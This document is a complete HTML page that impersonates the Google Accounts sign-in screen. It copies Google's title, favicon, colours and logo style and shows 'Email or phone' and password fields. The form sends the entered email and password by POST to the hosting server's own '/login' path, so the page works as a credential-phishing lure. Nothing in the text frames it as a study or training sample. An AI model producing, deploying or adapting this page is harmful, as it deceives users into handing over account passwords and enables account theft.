<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Sign in - Google Accounts</title>
<link rel="icon" href="https://www.google.com/favicon.ico">
<style>
*{margin:0;padding:0;box-sizing:border-box}
@keyframes fadeInUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
@keyframes fadeIn{from{opacity:0}to{opacity:1}}
@keyframes slideDown{from{opacity:0;transform:translateY(-20px)}to{opacity:1;transform:translateY(0)}}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}
@keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}
@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:linear-gradient(135deg,#f0f4f9 0%,#d9e2ec 50%,#bcccdc 100%);display:flex;align-items:center;justify-content:center;min-height:100vh;animation:fadeIn 1s ease}
.card{background:white;padding:48px 40px;border-radius:28px;box-shadow:0 4px 40px rgba(0,0,0,0.08);max-width:450px;width:92%;text-align:center;animation:fadeInUp 0.8s cubic-bezier(0.16,1,0.3,1);position:relative;overflow:hidden}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,#4285f4,#ea4335,#fbbc05,#34a853);background-size:200% 100%;animation:shimmer 3s linear infinite}
.logo{margin-bottom:20px;animation:slideDown 0.6s ease 0.2s both}
.logo svg{width:75px;height:24px}
h1{font-size:24px;font-weight:400;color:#202124;margin-bottom:8px;animation:fadeInUp 0.6s ease 0.3s both}
.subtitle{font-size:16px;color:#5f6368;margin-bottom:32px;animation:fadeInUp 0.6s ease 0.4s both}
.input-group{position:relative;margin-bottom:24px;text-align:left;animation:fadeInUp 0.6s ease 0.5s both}
.input-group input{width:100%;padding:18px 16px 8px;border:2px solid #dadce0;border-radius:8px;font-size:16px;outline:none;transition:all 0.3s cubic-bezier(0.4,0,0.2,1);background:transparent}
.input-group input:focus{border-color:#1a73e8;box-shadow:0 0 0 3px rgba(26,115,232,0.15)}
.input-group label{position:absolute;left:16px;top:50%;transform:translateY(-50%);color:#5f6368;font-size:16px;transition:all 0.3s cubic-bezier(0.4,0,0.2,1);pointer-events:none}
.input-group input:focus+label,.input-group input:not(:placeholder-shown)+label{top:12px;font-size:11px;color:#1a73e8;font-weight:500}
.forgot{color:#1a73e8;font-size:14px;text-decoration:none;display:block;text-align:left;margin-bottom:28px;transition:color 0.2s;animation:fadeInUp 0.6s ease 0.6s both}
.forgot:hover{color:#174ea6;text-decoration:underline}
.btn{width:100%;padding:14px;background:#1a73e8;color:white;border:none;border-radius:24px;font-size:16px;font-weight:500;cursor:pointer;transition:all 0.3s cubic-bezier(0.4,0,0.2,1);animation:fadeInUp 0.6s ease 0.7s both;position:relative;overflow:hidden}
.btn:hover{background:#1557b0;box-shadow:0 4px 15px rgba(26,115,232,0.4);transform:translateY(-2px)}
.btn:active{transform:translateY(0);box-shadow:0 2px 8px rgba(26,115,232,0.3)}
.btn::after{content:'';position:absolute;top:50%;left:50%;width:0;height:0;background:rgba(255,255,255,0.2);border-radius:50%;transform:translate(-50%,-50%);transition:width 0.6s,height 0.6s}
.btn:active::after{width:300px;height:300px}
.footer{margin-top:32px;display:flex;justify-content:space-between;align-items:center;animation:fadeIn 0.6s ease 0.8s both}
.create{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;padding:10px 16px;border-radius:20px;transition:background 0.2s}
.create:hover{background:#e8f0fe}
.privacy{margin-top:30px;font-size:12px;color:#5f6368;animation:fadeIn 0.6s ease 0.9s both}
.privacy a{color:#5f6368;text-decoration:none;margin:0 8px;transition:color 0.2s}
.privacy a:hover{color:#202124;text-decoration:underline}
</style>
</head>
<body>
<div class="card">
    <div class="logo">
        <svg viewBox="0 0 75 24"><path d="M0 19.5V4.5h3.2l6.8 10.5V4.5h2.8v15h-3l-7-10.8V19.5H0z" fill="#4285F4"/><path d="M16.5 19.8c-1.5 0-2.7-.5-3.5-1.5-.8-1-1.2-2.2-1.2-3.8 0-1.6.4-2.9 1.3-3.8.9-1 2-1.5 3.4-1.5 1.3 0 2.3.4 3.1 1.3.8.9 1.2 2 1.2 3.5v1.2h-6.3c.1.8.4 1.4.8 1.8.5.4 1 .6 1.7.6.9 0 1.6-.3 2.1-1l1.5 1.5c-.8 1.1-2 1.7-3.6 1.7h-.5z" fill="#EA4335"/><path d="M24 19.5V4.5h2.8v5.8c.7-1 1.7-1.5 3-1.5 1.2 0 2.1.4 2.8 1.3.7.9 1 2 1 3.4v6h-2.8v-5.5c0-.8-.2-1.4-.5-1.8-.3-.4-.8-.6-1.4-.6-.7 0-1.2.2-1.6.7-.4.5-.5 1.1-.5 1.9v5.3H24z" fill="#FBBC05"/><path d="M35 19.5V4.5h2.8v15H35z" fill="#34A853"/><path d="M44.5 19.8c-1.6 0-2.8-.5-3.7-1.5-.9-1-1.3-2.3-1.3-3.8 0-1.6.4-2.9 1.3-3.9.9-1 2.1-1.5 3.7-1.5s2.8.5 3.7 1.5c.9 1 1.3 2.3 1.3 3.9 0 1.5-.4 2.8-1.3 3.8-.9 1-2.1 1.5-3.7 1.5z" fill="#4285F4"/></svg>
    </div>
    <h1>Sign in</h1>
    <p class="subtitle">Use your Google Account</p>
    <form action="/login" method="POST">
        <div class="input-group">
            <input type="text" name="email" id="email" placeholder=" " required autocomplete="username">
            <label for="email">Email or phone</label>
        </div>
        <div class="input-group">
            <input type="password" name="password" id="password" placeholder=" " required autocomplete="current-password">
            <label for="password">Enter your password</label>
        </div>
        <a href="#" class="forgot">Forgot password?</a>
        <button type="submit" class="btn">Next</button>
    </form>
    <div class="footer">
        <span style="color:#5f6368;font-size:12px">English (US)</span>
        <a href="#" class="create">Create account</a>
    </div>
    <div class="privacy"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
</div>
</body>
</html>
